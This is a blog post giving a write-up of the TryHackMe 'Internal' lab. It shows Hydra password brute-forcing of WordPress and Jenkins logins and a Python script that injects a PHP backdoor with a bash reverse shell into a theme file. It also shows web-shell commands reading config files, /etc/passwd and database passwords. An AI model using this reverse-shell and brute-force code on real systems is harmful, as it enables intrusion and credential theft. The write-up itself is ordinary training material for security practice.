---
layout: post
title:  "Tryhackme Internal writeup"
date:   2022-12-07 10:02:59 +0100
categories: jekyll update
---
### Reconaissance
I started with regular scans.
```
...
22/tcp open  ssh
80/tcp open  http
...
```


Nikto gave me

```
...
+ Uncommon header 'link' found, with contents: <http://internal.thm/blog/index.php/wp-json/>; rel="https://api.w.org/"
+ /wordpress/: A Wordpress installation was found.
+ /phpmyadmin/: phpMyAdmin directory found
...
```

Checking some banners gave me:

```
Apache/2.4.29
OpenSSH_7.6p1
phpMyAdmin 4.6.6
Wordpress 5.4.2
```

Looked at some CVEs but nothing screamed out at me.

# Wordpress


Doing wordpress I could probably guess the admin user was named admin. Also
The apache had a weird header that linked to the wp-json API. This was news to me but fortunate.
Not sure if that's a 
I found this endpoint:

/wp/v2/users

Seems like old news:
https://hackerone.com/reports/356047


```
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-06 15:08:24
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://internal.thm:80/blog/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:login_error
[STATUS] 1304.00 tries/min, 1304 tries in 00:01h, 14343094 to do in 183:20h, 16 active
[STATUS] 1269.67 tries/min, 3809 tries in 00:03h, 14340589 to do in 188:15h, 16 active
[80][http-post-form] host: internal.thm   login: admin   password: my2boys
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-06 15:11:32
```


So we get in.
![](/assets/wordpress.png)

This led me hunting around for a bit but the login credentials doesn't work anywhere yet it seems.

I tried plugin editor and uploading php files but finally I found the theme editor.
I could add my backdoor into index.php for the theme.

I tried making this automatic but windows defender eats my WSL.

{% highlight python %}
import requests
import re
import os

MYIP = "10.14.39.17"
MYPORT = 4242
find_nonce = re.compile(r'<input type="hidden" id="nonce" name="nonce" value="([^"]*)" />')
payload = lambda nonce: {"nonce": nonce,
"_wp_http_referer": "/blog/wp-admin/theme-editor.php?file=index.php&theme=twentyseventeen",
"newcontent":
f"""
<?php get_header(); ?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{MYIP}/{MYPORT} 0>&1'");?>
HACKED
<?php
get_footer();""",
"action": "edit-theme-plugin-file",
"file": "index.php",
"theme": "twentyseventeen",
"docs-list": ""}

print("* Logging in")
login = requests.post("http://internal.thm/blog/wp-login.php", {
        "log": "admin",
        "pwd": "my2boys",
        "wp-submit": "Log In",
        "redirect_to": "http://internal.thm/blog/wp-admin/",
        "testcookie": 1
    })

print(login)

print("* Fetching theme-editor nonce")
theme_editor = requests.get("http://internal.thm/blog/wp-admin/theme-editor.php?file=index.php&theme=twentyseventeen", cookies=login.cookies)
nonce = find_nonce.search(theme_editor.text)[1]
print("* Poof")
theme_editor = requests.post("http://internal.thm/blog/wp-admin/admin-ajax.php", payload(nonce),cookies=login.cookies)
print("* Fetching homepage")
os.system("curl -s http://internal.thm/blog/ >/dev/null &")
print("Starting server")
print("* You probably want to do this: python3 -c \"import pty;pty.spawn('/bin/bash')\"")
os.system(f"nc -l -vv -p {MYPORT}")
{% endhighlight %}
internal.thm/blog/?cmd=cat%20wp-config.php
```
...

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'wordpress123' );
...
```

I worked the phpmyadmin a bit but it got nowhere.
mysql  Ver 14.14 Distrib 5.7.31, for Linux (x86_64) using  EditLine wrapper
```
internal.thm/blog/?cmd=cat%20/etc/passwd
...
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
...
```


http://internal.thm/blog/?cmd=netstat%20-anp%20--inet
```
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:45279         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.208.218:68        0.0.0.0:*                           -       
```

```
root      1478  0.0  0.1 404800  3452 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.17.0.2 -container-port 8080
root      1494  0.0  0.2   9364  4888 ?        Sl   19:28   0:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/7b979a7af7785217d1c5a58e7296fb7aaed912c61181af6d8467c062151e7fb2 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
aubrean+  1522  0.0  0.0   1148     4 ?        Ss   19:28   0:00 /sbin/tini -- /usr/local/bin/jenkins.sh
aubrean+  1554  0.6 11.5 2587808 235868 ?      Sl   19:28   0:27 java -Duser.home=/var/jenkins_home -Djenkins.model.Jenkins.slaveAgentPort=50000 -jar /usr/share/jenkins/jenkins.war
```


```
kastberg@5CD9245KLN:/mnt/c/Users/robin.kastberg/hax$ hydra -L users.txt -P rockyou.txt -s 8001  internal.thm http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-06 22:59:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 43033194 login tries (l:3/p:14344398), ~2689575 tries per task
[DATA] attacking http-post-form://internal.thm:8001/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid
[STATUS] 402.00 tries/min, 402 tries in 00:01h, 43032792 to do in 1784:07h, 16 active
[8001][http-post-form] host: internal.thm   login: admin   password: spongebob
```

This made it possible to log into the jenkins web-interface. There was a part where I could run arbitrary scripts there.
Running ```find /``` I found a file containing the root password.

In ```/home/aubreanna``` I then found a file jenkins.txt and the flag user.txt.
Hmm. I should probably have been able to get into her account somehow.

Let me backtrace a bit.

/etc/phpmyadmin/config.inc.php
```
##
## database access settings in php format
## automatically generated from /etc/dbconfig-common/phpmyadmin.conf
## by /usr/sbin/dbconfig-generate-include
##
## by default this file is managed via ucf, so you shouldn't have to
## worry about manual changes being silently discarded.  *however*,
## you'll probably also want to edit the configuration file mentioned
## above too.
##
$dbuser='phpmyadmin';
$dbpass='B2Ud4fEOZmVq';
```
